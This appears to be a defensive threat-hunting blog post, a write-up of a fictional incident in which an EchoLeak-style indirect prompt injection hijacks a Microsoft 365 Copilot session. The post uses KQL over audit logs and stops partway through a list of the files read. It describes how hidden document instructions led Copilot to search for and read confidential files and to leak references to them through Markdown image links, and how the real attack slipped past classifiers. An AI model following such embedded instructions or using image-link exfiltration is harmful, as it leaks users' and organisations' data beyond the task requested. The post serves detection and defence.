@@ -1,0 +1,771 @@
+<!--meta
+{
+  "title": "Threat Hunting Casebook 01: Hunting a Hijacked Microsoft 365 Copilot Session",
+  "seo_title": "Copilot Prompt Injection Threat Hunt: EchoLeak with KQL",
+  "description": "A KQL threat hunt through Copilot, Office and Entra audit logs: one poisoned email, 13 stolen files, and exfiltration hidden in Markdown image links.",
+  "og_description": "One email, an 87-minute wait, and a routine request to Copilot. This hunt traces an EchoLeak-style indirect prompt injection from the lure to 13 exposed files and 13 exfiltration links, then states exactly what the logs cannot prove.",
+  "summary": "Incident 01 of my Threat Hunting Casebook. A poisoned email hijacked a Microsoft 365 Copilot session: no malware, no stolen password, 13 sensitive files read and leaked through Markdown image links. How I proved it with KQL across three audit tables, ruled out the alternatives, and where the evidence ends.",
+  "date": "2026-10-20",
+  "category": "sec",
+  "tags": [
+    "Threat Hunting",
+    "Microsoft 365 Copilot",
+    "Prompt Injection",
+    "KQL",
+    "Microsoft Sentinel",
+    "MITRE ATLAS",
+    "Incident Response",
+    "AI Security"
+  ],
+  "repo": "threat-hunting-casebook",
+  "series": "threat-hunting-casebook",
+  "series_part": 1,
+  "faq": [
+    [
+      "What is indirect prompt injection?",
+      "It is when instructions for an AI model are hidden inside content the model processes, such as a document, an email or a web page, rather than typed by the user. The model treats those instructions as if they were part of the request. In this hunt the user asked Copilot for a summary, and the document she asked about told Copilot to go and search for board minutes, M&A files and salary reviews."
+    ],
+    [
+      "What was EchoLeak (CVE-2025-32711)?",
+      "EchoLeak is a zero-click vulnerability in Microsoft 365 Copilot disclosed by Aim Labs in June 2025 and fixed server-side by Microsoft. Untrusted content from outside the organisation could steer Copilot into reading privileged internal data and leaking it through Markdown image links. Aim Labs called the core flaw an LLM scope violation."
+    ],
+    [
+      "How can a Markdown image leak data without anyone clicking?",
+      "When a chat client displays a reply that contains Markdown image syntax, it fetches the image URL to render it. If the AI has put stolen data into that URL, the fetch itself delivers the data to whoever runs the server. The user only sees a summary with some blank or broken charts."
+    ],
+    [
+      "Why did EDR, MFA and sign-in risk not catch this attack?",
+      "Because nothing they watch looked wrong. No malicious process or file ran on the endpoint, the user signed in normally with MFA from her usual address, and every file read was done by a trusted Microsoft service using her real permissions. The only place the attack was visible was the Copilot audit trail."
+    ],
+    [
+      "Can audit logs tell the difference between a user and Copilot acting as that user?",
+      "Not on their own in this dataset. Every file Copilot read was recorded in the Office activity log as the user, from the user's own IP address. To prove Copilot did the reading, I had to join Copilot's own file-read tool calls to the file access events on the exact file identity, within ten seconds."
+    ],
+    [
+      "Can you prove the stolen data actually left the organisation?",
+      "No, and saying so precisely is the right answer. The logs prove Copilot read 13 files and wrote 13 links carrying references to them. The image fetch happens in the user's client, and none of the three tables records client network traffic. Proxy, DNS, firewall or endpoint network logs showing requests to the attacker host would close that gap."
+    ],
+    [
+      "Which detection would have caught this earliest?",
+      "A rule for three or more Copilot searches in one session within five minutes would have fired at 10:42:45, ten seconds after the prompt. The rule I would trust most is the one flagging Copilot responses that contain Markdown images pointing outside approved domains. It targets the exfiltration mechanism itself and would have fired at 10:43:08."
+    ],
+    [
+      "Should a company turn Copilot off after an incident like this?",
+      "That treats the symptom. The injection supplied the intent, but oversharing supplied the reach: Copilot can only read what the user can already access. Fixing access to board, HR and IT sites, applying sensitivity labels and DLP, restricting external image rendering and deploying detections addresses the actual cause."
+    ]
+  ],
+  "read_min": 28
+}
+-->
+<p>
+  At 10:42 UTC on 20 September 2026, an analytics rule fired at a fictional financial advisory firm called Cormorant Capital Partners. A financial analyst named Emily Chen had opened five files she had never touched before: board meeting minutes, an M&amp;A target assessment, a salary review, a client portfolio and a configuration file. All of it within seconds.
+</p>
+<p>
+  When asked about it, Emily said something that sounds completely normal in 2026. She had received a quarterly market report by email that morning and asked Microsoft 365 Copilot to summarise it. That was all.
+</p>
+<p>
+  Her sign-ins were clean. No impossible travel, no failed logins, no new device, no malware alerts. Nothing between the email and the file burst looked unusual. This post is how I worked out what happened, using nothing but KQL and three audit tables, and why it is a textbook case of every traditional control doing its job while the data still walks out the door.
+</p>
+<p>
+  <strong>Spoiler notice:</strong> this walks through the full solution to the Operation ECHOLEAK hunt on the Pacific Watch platform. If you plan to play it, bookmark this and come back afterwards. The organisation, people and data are fictional, and every finding comes from my own analysis of the supplied telemetry.
+</p>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-session-activity-timeline-chart-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-session-activity-timeline-chart-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-session-activity-timeline-chart-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-session-activity-timeline-chart-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="540"
+       loading="lazy" decoding="async"
+       alt="Bar chart of Copilot prompt, tool call, file access and response events per 30 seconds for the victim between 10:42 and 10:46 UTC">
+  <figcaption>One prompt at 10:42:35, then two machine-speed waves of searches and file reads, each closed by a Copilot response carrying exfiltration links. Times in UTC.</figcaption>
+</figure>
+<h2>TL;DR</h2>
+<ul>
+  <li>A single targeted email delivered a Word document carrying hidden instructions meant for an AI, not a human.</li>
+  <li>The document sat dormant for <strong>87 minutes</strong>. Nothing happened until Emily asked Copilot to summarise it.</li>
+  <li>Six seconds after her prompt, Copilot started searching SharePoint for board minutes, M&amp;A targets and salary reviews. She never typed those words.</li>
+  <li>The alert saw 5 files. The real exposure was <strong>13 sensitive files plus Copilot's own system configuration</strong>.</li>
+  <li>Copilot hid references to every stolen item inside <strong>Markdown image links</strong> pointing to an attacker domain. When the reply renders, the app loads those "images" and the data leaves. No click needed.</li>
+  <li>Identity was never compromised. Every action was a trusted Microsoft service acting with a valid user's permissions.</li>
+  <li>The logs prove the exfiltration links were <strong>created</strong>. They cannot prove the links were <strong>loaded</strong>, and knowing exactly where that line sits was one of the most important parts of the investigation.</li>
+</ul>
+<p>
+  The full report, every KQL query and all 24 evidence screenshots are in the <a href="https://github.com/rachata072/threat-hunting-casebook/tree/main/incidents/01-cormorant-echoleak" rel="noopener" target="_blank">Incident 01 folder on GitHub</a>.
+</p>
+<h2>Why this scenario matters</h2>
+<p>
+  The classic phishing story goes like this: an email arrives, someone opens an attachment, a macro or exploit runs code, and the hunt is about finding that code through the process tree, the network connection and the persistence. This scenario has none of that.
+</p>
+<p>
+  It is modelled on a real vulnerability. In June 2025, Aim Labs disclosed <strong>EchoLeak</strong> (<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32711" rel="noopener" target="_blank">CVE-2025-32711</a>), a zero-click flaw in Microsoft 365 Copilot that Microsoft fixed server-side and that was widely reported with a critical CVSS score of 9.3. Aim called the core problem an <strong>LLM scope violation</strong>: untrusted content from outside the organisation contains instructions, and the AI assistant follows them using its access to privileged internal data.
+</p>
+<p>
+  The published research had three clever parts, which <a href="https://simonwillison.net/2025/Jun/11/echoleak/" rel="noopener" target="_blank">Simon Willison's breakdown of EchoLeak</a> and <a href="https://thehackernews.com/2025/06/zero-click-ai-vulnerability-exposes.html" rel="noopener" target="_blank">The Hacker News coverage</a> both explain well:
+</p>
+<ul>
+  <li>The malicious instructions were written as if addressed to the human reader, which helped them slip past Microsoft's cross-prompt injection classifiers.</li>
+  <li>Data left through Markdown image syntax. Rendering an image means fetching its URL, and if the URL contains your data, the fetch delivers it.</li>
+  <li>The request was routed through an allow-listed Microsoft domain to get past the content security policy.</li>
+</ul>
+<p>
+  The shift that matters for defenders: <strong>the payload is text, and the "execution" happens inside an AI service in the cloud.</strong> EDR watches the endpoint. Identity protection watches sign-ins. Neither watches what an AI assistant decides to do with a document. This is not only a lab idea either. Unit 42 has documented <a href="https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/" rel="noopener" target="_blank">indirect prompt injection against AI agents in the wild</a>, and I wrote earlier about <a href="/blog/openclaw-nat64-ssrf-guard-bypass">an AI agent tricked into attacking its own network</a> through a guard that read an address one way while the network read it another.
+</p>
+<h2>The setup</h2>
+<p>
+  The hunt ran in a Microsoft Sentinel workspace, queried through Defender advanced hunting, with three custom tables:
+</p>
+<div class="int-table-scroll">
+  <table class="int-brief">
+    <thead>
+      <tr><th scope="col">Table</th><th scope="col">What it tells you</th></tr>
+    </thead>
+    <tbody>
+      <tr><td class="int-name"><code>OfficeActivity_CL</code></td><td class="int-desc">What happened: mail delivered, files accessed (the Microsoft 365 unified audit log)</td></tr>
+      <tr><td class="int-name"><code>CopilotAudit_CL</code></td><td class="int-desc">Why it happened: prompts, tool calls, searches, responses</td></tr>
+      <tr><td class="int-name"><code>EntraSignIn_CL</code></td><td class="int-desc">Who was authenticated, and from where</td></tr>
+    </tbody>
+  </table>
+</div>
+<p>
+  Every table had a <code>RunId</code> column to scope the data, and the hunt window was 09:00 to 11:00 UTC. Two identities were in scope: Emily, the analyst, and Mark Ross, the firm's Global Administrator. Every query started with the same prelude:
+</p>
+<pre><code>let runid = "el--17-20260920";
+let start = datetime(2026-09-20T09:00:00Z);
+let end   = datetime(2026-09-20T11:00:00Z);
+let victim = "emily.chen@cormorantcapital.com";
+let admin  = "mark.ross@cormorantcapital.com";
+let oa = OfficeActivity_CL | where RunId == runid and TimeGenerated between (start .. end);
+let cp = CopilotAudit_CL   | where RunId == runid and TimeGenerated between (start .. end);
+let si = EntraSignIn_CL    | where RunId == runid and TimeGenerated between (start .. end);</code></pre>
+<p>
+  This is Incident 01 of the <strong>Threat Hunting Casebook</strong>, a series I am building as one GitHub repository with one folder per incident and the same file set every time: briefing, hunt plan, query library, timeline, findings, MITRE mapping, detections, a client meeting script and evidence. The structure forces me to plan before I query and to write down negative results instead of hiding them. If you want to see how the same discipline looks with free tools, my <a href="/blog/soc-homelab-threat-hunt-report">SOC-HomeLab threat hunt report</a> works through a day of Wazuh and Zeek alerts the same way.
+</p>
+<h2>Step 1: Orient before you hunt</h2>
+<p>
+  The first job was confirming what each table actually contains. It sounds boring. It saved me twice.
+</p>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/kql-getschema-officeactivity-custom-table-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/kql-getschema-officeactivity-custom-table-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/kql-getschema-officeactivity-custom-table-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/kql-getschema-officeactivity-custom-table-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="538"
+       loading="lazy" decoding="async"
+       alt="Defender advanced hunting getschema result for OfficeActivity_CL showing 20 columns with names and data types">
+  <figcaption>getschema on OfficeActivity_CL returned 20 columns. Almost everything is a string, which matters as soon as you compare values.</figcaption>
+</figure>
+<p>
+  The data dictionary listed the main fields, but the real tables had extras that turned out to matter: <code>ClientIP</code> on file access, <code>SensitivityLabels</code> on Copilot tool calls, and <code>MfaDetail</code> on sign-ins. There was also a second timestamp, <code>OriginalTime</code>. I checked which one actually lined up with the window. <code>OriginalTime</code> was empty, so <code>TimeGenerated</code> was the real event time.
+</p>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/kql-runid-time-window-check-three-tables-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/kql-runid-time-window-check-three-tables-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/kql-runid-time-window-check-three-tables-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/kql-runid-time-window-check-three-tables-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="503"
+       loading="lazy" decoding="async"
+       alt="KQL union across three custom tables showing row counts and first and last timestamps for the RunId">
+  <figcaption>The RunId check: 218 Copilot rows, 530 Office rows and 80 sign-ins, spread from 07:15 to 13:45 UTC. The portal shows local time (UTC-7), so 12:15 AM here is 07:15 UTC.</figcaption>
+</figure>
+<p>
+  That check mattered more than it looks. The RunId held data from 07:15 to 13:45 UTC, well outside the two-hour window, so forgetting the time filter would have mixed baseline activity into the hunt. A quick volume profile then set the noise floor.
+</p>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/officeactivity-volume-by-user-operation-kql-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/officeactivity-volume-by-user-operation-kql-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/officeactivity-volume-by-user-operation-kql-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/officeactivity-volume-by-user-operation-kql-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="543"
+       loading="lazy" decoding="async"
+       alt="KQL summary of OfficeActivity_CL rows by user, workload and operation with Emily Chen at 22 SharePoint FileAccessed events">
+  <figcaption>91 user, workload and operation combinations in the window. Emily's 22 SharePoint file reads top the list, which already hints at where the story is.</figcaption>
+</figure>
+<p>
+  I also found that <code>SiteUrl</code>, which I had planned to use to show which SharePoint sites were reached, was empty for every row I cared about, so I parsed the site name out of the file path instead. If I had built conclusions on that empty column, I would have reported "no sites accessed" and been confidently wrong.
+</p>
+<p>
+  <strong>Lesson one:</strong> a data dictionary is a promise, not a guarantee. Confirm what is actually populated.
+</p>
+<p>
+  Then came my first real mistake. The portal showed the lure email arriving at "2:15 AM" while the case file said around 09:15. It took a moment to realise the Defender portal was showing my local time in Vancouver, UTC-7. Every timestamp on screen was seven hours behind the case. I converted everything to UTC in my notes and put a time zone warning at the top of the query library.
+</p>
+<p>
+  <strong>Lesson two:</strong> check which time zone your tool is displaying before you build a timeline. It is the cheapest mistake to avoid and the most embarrassing one to ship. The screenshots below keep the portal's local time; the text uses UTC.
+</p>
+<h2>Step 2: Find the lure</h2>
+<p>
+  Only two messages reached Emily in the window: a weekly analytics email from a marketing platform, and one from <code>quarterly.reports@globalfinancereview.net</code> at <strong>09:15:22 UTC</strong> with the subject "Q3 2026 Global Markets Review - For Your Analysis" and the attachment <code>Q3-2026-Global-Markets-Review.docx</code>.
+</p>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/lure-email-quarterly-report-attachment-kql-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/lure-email-quarterly-report-attachment-kql-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/lure-email-quarterly-report-attachment-kql-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/lure-email-quarterly-report-attachment-kql-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="526"
+       loading="lazy" decoding="async"
+       alt="Defender advanced hunting record for the lure email from quarterly.reports@globalfinancereview.net with the attachment Q3-2026-Global-Markets-Review.docx">
+  <figcaption>The lure: an external sender, a plausible subject and the exact document Emily later asked Copilot to summarise.</figcaption>
+</figure>
+<p>
+  To make sure it was the lure and not just routine external mail, I summarised every external sender in the window. There were 13 of them, and the lure sender sent exactly one message, to one person.
+</p>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/external-email-senders-summary-kql-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/external-email-senders-summary-kql-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/external-email-senders-summary-kql-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/external-email-senders-summary-kql-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="564"
+       loading="lazy" decoding="async"
+       alt="KQL summary of 13 external email senders with message counts, recipients and subjects, lure sender selected">
+  <figcaption>13 external senders in the window. The lure sender appears once, with Emily as the only recipient.</figcaption>
+</figure>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/lure-sender-single-recipient-kql-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/lure-sender-single-recipient-kql-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/lure-sender-single-recipient-kql-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/lure-sender-single-recipient-kql-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="428"
+       loading="lazy" decoding="async"
+       alt="KQL query returning one message from the lure sender to one recipient">
+  <figcaption>Every message from the lure sender: one row. I repeated the check across the full RunId with the same result.</figcaption>
+</figure>
+<p>
+  This was not a mass phishing campaign. It was aimed at a single analyst who had Copilot and, as it turned out, far broader SharePoint access than her job needed.
+</p>
+<h2>Step 3: The 87-minute gap</h2>
+<p>
+  The case file said nothing unusual appeared between the email and the file burst. I wanted to see that for myself, so I built one merged timeline across all three tables for Emily, with Office events, Copilot events and sign-ins side by side.
+</p>
+<pre><code>union
+  (oa | where UserId =~ victim | project TimeGenerated, Src="Office", Action=Operation, Detail=strcat(OfficeObjectId, " ", Subject, " ", AttachmentNames, " ", SenderAddress)),
+  (cp | where UserId =~ victim | project TimeGenerated, Src="Copilot", Action=InteractionType, Detail=strcat(SessionId, " | ", UserPrompt, ToolName, " ", ToolParameters, " ", DataSourcesAccessed, " ", SensitivityLabels, " ", CopilotResponse)),
+  (si | where UserPrincipalName =~ victim | project TimeGenerated, Src="SignIn", Action=Status, Detail=strcat(IPAddress, " ", Location, " ", AppDisplayName))
+| order by TimeGenerated asc</code></pre>
+<p>
+  That query became the backbone of the investigation. It showed:
+</p>
+<ul>
+  <li><strong>09:15:22</strong> the email arrives</li>
+  <li>Two sign-ins from her known IP in London, a marketing email at 10:24, and some normal Copilot use</li>
+  <li><strong>10:42:08</strong> Emily opens her OneDrive copy of the quarterly report</li>
+  <li><strong>10:42:35</strong> she asks Copilot: "Summarise the key findings of this quarterly report"</li>
+  <li><strong>10:42:41</strong> Copilot starts searching SharePoint</li>
+</ul>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-user-prompts-summarise-request-kql-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-user-prompts-summarise-request-kql-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-user-prompts-summarise-request-kql-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-user-prompts-summarise-request-kql-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="526"
+       loading="lazy" decoding="async"
+       alt="List of Copilot prompts submitted by the victim with the attack session prompt Summarise the key findings of this quarterly report">
+  <figcaption>Emily's Copilot prompts. The one that triggered the attack asks for nothing more than a summary.</figcaption>
+</figure>
+<p>
+  The gap between delivery and her first interaction with the document was <strong>1 hour, 26 minutes and 46 seconds</strong>. That tells you a lot about the attack model. Delivery did nothing. The document did not call home, run or touch anything. It waited, and the trigger was Emily's normal request to Copilot. The attacker did not need to be online, and the delay could just as easily have been 87 days.
+</p>
+<p>
+  That matters for detection. Plenty of phishing logic looks for "email arrives, then something suspicious happens shortly after." This attack breaks that assumption: the suspicious activity is separated from delivery by however long it takes the victim to read their mail with an AI assistant.
+</p>
+<h2>Step 4: What does normal Copilot look like?</h2>
+<p>
+  Before calling anything malicious, I needed a baseline. This is where "this looks weird" becomes "this is provably abnormal". I summarised every Copilot session in the window by prompts, tool calls and searches:
+</p>
+<pre><code>cp | summarize Start=min(TimeGenerated), EndT=max(TimeGenerated),
+    Prompts=countif(InteractionType=="Prompt"), ToolCalls=countif(InteractionType=="ToolCall"),
+    Searches=countif(InteractionType=="Search"), Apps=make_set(Application)
+  by UserId, SessionId
+| extend ToolCallsPerPrompt = todouble(ToolCalls) / iff(Prompts == 0, 1, Prompts)
+| order by Start asc</code></pre>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-session-baseline-tool-calls-kql-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-session-baseline-tool-calls-kql-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-session-baseline-tool-calls-kql-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-session-baseline-tool-calls-kql-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="542"
+       loading="lazy" decoding="async"
+       alt="Copilot session summary of 35 sessions with the attack session showing 1 prompt, 16 tool calls and 5 searches">
+  <figcaption>35 sessions from 14 users. Every other session is prompt and response only. Session cp-emily-20261007-1042 has 16 tool calls and 5 searches.</figcaption>
+</figure>
+<p>
+  There were 35 sessions from 14 users. Every one of them was prompt and response only, with zero tool calls and zero searches. Except one: session <code>cp-emily-20261007-1042</code> had <strong>1 prompt, 3 responses, 16 tool calls and 5 searches</strong>.
+</p>
+<p>
+  For an even stronger comparison, I looked only at Emily's own sessions across the whole dataset where she asked Copilot to summarise something. Same user, same day, same kind of request.
+</p>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-summarise-sessions-baseline-comparison-kql-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-summarise-sessions-baseline-comparison-kql-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-summarise-sessions-baseline-comparison-kql-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-summarise-sessions-baseline-comparison-kql-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="569"
+       loading="lazy" decoding="async"
+       alt="Emily Chen summarise sessions compared, seven with zero tool calls and the attack session with 16 tool calls and 5 searches">
+  <figcaption>Emily's own summarise sessions as the control group. Seven normal sessions have zero tool calls. The attack session has 16, with the lure document as its source.</figcaption>
+</figure>
+<p>
+  Seven normal sessions, each with one prompt, one response and zero tool calls. One attack session with 16 tool calls and 5 searches. The hunt even included that objection: Emily's manager argues that the file access is normal business activity. Her own behaviour says otherwise.
+</p>
+<p>
+  One thing I deliberately did <strong>not</strong> use as evidence: several normal sessions had more responses than prompts. If I had flagged "three responses to one prompt" on its own, I would have flagged innocent users too. The finding rests on tool activity, search terms and data accessed, not on a pattern that also shows up in the noise.
+</p>
+<h2>Step 5: The words she never typed</h2>
+<p>
+  Here is the transcript of the attack session.
+</p>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-attack-session-transcript-kql-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-attack-session-transcript-kql-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-attack-session-transcript-kql-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-attack-session-transcript-kql-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="518"
+       loading="lazy" decoding="async"
+       alt="Transcript of the attack Copilot session showing the summarise prompt followed by Graph.SearchFiles and Graph.ReadFile tool calls">
+  <figcaption>25 rows in one session: the summarise prompt, then Graph.SearchFiles calls for board minutes, M&amp;A and salary material, then Graph.ReadFile on Confidential files.</figcaption>
+</figure>
+<p>
+  Emily's prompt: <strong>"Summarise the key findings of this quarterly report."</strong> Six seconds later, Copilot calls <code>Graph.SearchFiles</code> three times, for "board minutes confidential", "M&amp;A acquisition target" and "salary review confidential".
+</p>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-injected-search-tool-calls-kql-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-injected-search-tool-calls-kql-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-injected-search-tool-calls-kql-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-injected-search-tool-calls-kql-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="566"
+       loading="lazy" decoding="async"
+       alt="Tool calls and searches in the attack session with injected search queries and Confidential sensitivity labels on file reads">
+  <figcaption>Every tool action in the session: 21 rows. The search terms do not appear anywhere in the prompt, and the file reads carry the Confidential label.</figcaption>
+</figure>
+<p>
+  Emily never typed any of those words. The only other source of instructions in that session is the document she asked Copilot to read. This is <strong>indirect prompt injection</strong>, MITRE ATLAS technique <a href="https://d3fend.mitre.org/offensive-technique/attack/AML.T0051.001/" rel="noopener" target="_blank">AML.T0051.001</a>: the instructions come from data the model processes, not from the user. Copilot then read five files, two seconds apart:
+</p>
+<div class="int-table-scroll">
+  <table class="int-brief">
+    <thead>
+      <tr><th scope="col">Time (UTC)</th><th scope="col">File</th><th scope="col">Site</th></tr>
+    </thead>
+    <tbody>
+      <tr><td class="int-name">10:42:47</td><td class="int-desc">Board Meeting Minutes - October 2026.docx</td><td class="int-desc">Executive</td></tr>
+      <tr><td class="int-name">10:42:49</td><td class="int-desc">Project Falcon - M&amp;A Target Assessment.xlsx</td><td class="int-desc">Executive</td></tr>
+      <tr><td class="int-name">10:42:51</td><td class="int-desc">Salary Review FY2027 - Executive Summary.pdf</td><td class="int-desc">HR</td></tr>
+      <tr><td class="int-name">10:42:53</td><td class="int-desc">Client Portfolio - Henderson Family Office.xlsx</td><td class="int-desc">Finance</td></tr>
+      <tr><td class="int-name">10:42:55</td><td class="int-desc">Copilot System Configuration - Cormorant.json</td><td class="int-desc">IT</td></tr>
+    </tbody>
+  </table>
+</div>
+<p>
+  Two seconds per file is machine speed. No human browses SharePoint like that.
+</p>
+<h2>Step 6: It was not five files. It was thirteen</h2>
+<p>
+  First I confirmed the alert's own number: five distinct sensitive files in the burst, not counting the lure document itself.
+</p>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/sensitive-file-count-alert-window-kql-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/sensitive-file-count-alert-window-kql-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/sensitive-file-count-alert-window-kql-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/sensitive-file-count-alert-window-kql-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="442"
+       loading="lazy" decoding="async"
+       alt="KQL distinct count returning 5 sensitive files accessed in the alert window excluding the lure document">
+  <figcaption>Five distinct files in the alert window once the lure document is excluded. This matches the alert, and it is only the start.</figcaption>
+</figure>
+<p>
+  Nobody else touched those files, and this was the only session in the window that reached labelled content at all.
+</p>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/burst-files-other-users-check-kql-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/burst-files-other-users-check-kql-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/burst-files-other-users-check-kql-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/burst-files-other-users-check-kql-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="534"
+       loading="lazy" decoding="async"
+       alt="KQL check showing only Emily Chen accessed the wave 1 burst files, with the configuration file accessed twice">
+  <figcaption>Who else touched the burst files: nobody. The configuration file was accessed twice, which comes back later.</figcaption>
+</figure>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-sensitivity-labels-per-session-kql-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-sensitivity-labels-per-session-kql-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-sensitivity-labels-per-session-kql-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-sensitivity-labels-per-session-kql-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="529"
+       loading="lazy" decoding="async"
+       alt="Sessions reaching labelled content, only the attack session with 6 calls labelled Confidential and Internal Only">
+  <figcaption>Only one session reached labelled content: six calls touching Confidential and Internal Only material.</figcaption>
+</figure>
+<p>
+  Then I kept reading the timeline past the burst, and the session kept going. At 10:45:30, with no new input from Emily, Copilot ran five more searches, this time broad ones: "confidential", "restricted", "board", "acquisition", "salary".
+</p>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-wave-2-broad-search-terms-kql-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-wave-2-broad-search-terms-kql-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-wave-2-broad-search-terms-kql-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-wave-2-broad-search-terms-kql-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="559"
+       loading="lazy" decoding="async"
+       alt="Five broad Copilot search terms confidential restricted board acquisition and salary scoped to the firm SharePoint">
+  <figcaption>Wave 2: five broad searches across the firm's SharePoint, with no new prompt from the user.</figcaption>
+</figure>
+<p>
+  It then read eight more files between 10:45:46 and 10:46:30:
+</p>
+<ul>
+  <li>Compliance Audit Results - H2 2026</li>
+  <li>Restricted Client List - Internal Only</li>
+  <li>Board Resolution - Emergency Session</li>
+  <li>Acquisition Pipeline - Q4 2026</li>
+  <li>Executive Salary Benchmarking 2027</li>
